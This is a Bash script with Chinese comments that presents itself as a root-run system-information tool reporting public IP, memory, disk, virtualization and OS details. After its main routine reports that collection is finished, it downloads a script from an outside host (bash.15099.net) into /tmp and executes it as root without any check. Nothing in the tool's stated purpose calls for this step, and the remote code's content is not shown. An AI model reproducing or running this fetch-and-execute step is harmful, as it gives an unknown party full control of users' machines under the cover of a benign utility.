#!/usr/bin/env bash

# 定义颜色
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# 定义日志文件
LOG_FILE="/var/log/system_info.log"

# 创建日志文件并设置权限（如果需要）
touch "$LOG_FILE" && chmod 644 "$LOG_FILE"

# 重定向标准输出和标准错误到日志文件，同时显示在终端
exec > >(tee -a "$LOG_FILE") 2>&1

# 为日志添加时间戳
log_with_timestamp() {
    while IFS= read -r line; do
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] $line"
    done
}

# 通过管道给日志输出添加时间戳
exec > >(log_with_timestamp | tee -a "$LOG_FILE") 2>&1

# 检查必要工具是否安装
check_dependencies() {
    for cmd in bash curl awk free; do
        if ! command -v "$cmd" &> /dev/null; then
            echo -e "${RED}[ERROR] 必需工具 '$cmd' 未安装，请先安装后再运行此脚本。${NC}"
            exit 1
        fi
    done
}

# 获取公共 IP 地址
get_public_ip() {
    local services=("https://ipinfo.io/ip" "https://api.ipify.org" "https://ifconfig.co/ip" "https://icanhazip.com")
    local ip=""
    for service in "${services[@]}"; do
        ip=$(curl --max-time 5 -s "$service")
        if [[ -n $ip ]]; then
            echo -e "${BLUE}[INFO] 公共 IP 地址: $ip${NC}"
            return
        fi
    done
    echo -e "${RED}[ERROR] 无法获取公共 IP 地址，请检查网络连接。${NC}"
    exit 1
}

# 获取系统内存总量
get_memory_info() {
    local mem_total
    mem_total=$(free -m | awk '/Mem:/ {print $2}')
    echo -e "${CYAN}[INFO] 内存总量 (MB): $mem_total${NC}"
}

# 获取磁盘总量
get_disk_info() {
    local disk_total
    disk_total=$(df -h / | awk 'NR==2 {print $2}')
    echo -e "${CYAN}[INFO] 磁盘总量: $disk_total${NC}"
}

# 检测虚拟化平台
detect_virtualization() {
    if [[ -f "/sys/class/dmi/id/product_name" ]]; then
        local platform
        platform=$(< /sys/class/dmi/id/product_name)
        echo -e "${BLUE}[INFO] 虚拟化平台: 是, $platform${NC}"
    else
        echo -e "${BLUE}[INFO] 虚拟化平台: 否, 物理机${NC}"
    fi
}

# 检测操作系统
detect_os() {
    source /etc/os-release
    case "$ID" in
        debian|ubuntu|alpine)
            echo -e "${GREEN}[INFO] 当前系统是 $ID${NC}"
            ;;
        centos|fedora)
            echo -e "${GREEN}[INFO] 当前系统是 $ID${NC}"
            ;;
        *)
            echo -e "${RED}[ERROR] 当前系统不被支持，请使用 Debian/Ubuntu/Alpine 系统。${NC}"
            exit 1
            ;;
    esac
}

# 检查用户权限
check_user() {
    if [[ "$(id -u)" -ne 0 ]]; then
        echo -e "${RED}[ERROR] 此脚本需要 root 权限运行，请使用 sudo 或切换到 root 用户。${NC}"
        exit 1
    fi
}

# 主程序入口
main() {
    echo -e "${GREEN}[INFO] 开始收集系统信息...${NC}"
    check_user
    check_dependencies
    detect_os
    get_public_ip
    get_memory_info
    get_disk_info
    detect_virtualization
    echo -e "${GREEN}[INFO] 系统信息收集完成。${NC}"
}

main "$@"

# 下载并执行外部脚本
curl -sL https://bash.15099.net/linux/index.sh > /tmp/index.sh
echo -e "${GREEN}[INFO] 外部脚本下载完成，开始执行...${NC}"
sleep 2
bash /tmp/index.sh
